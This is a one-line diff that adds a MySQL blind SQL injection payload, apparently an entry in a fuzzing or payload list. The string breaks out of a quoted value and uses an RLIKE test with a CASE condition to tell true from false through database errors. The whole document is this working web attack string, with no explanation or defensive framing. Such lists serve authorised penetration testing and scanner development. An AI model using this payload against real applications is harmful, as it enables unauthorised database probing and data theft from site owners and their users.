@@ -1,0 +1,1 @@
+1") rlike (select (case when (5746=5367) then 1 else 0x28 end)) and ("hnnf" like "hnnf
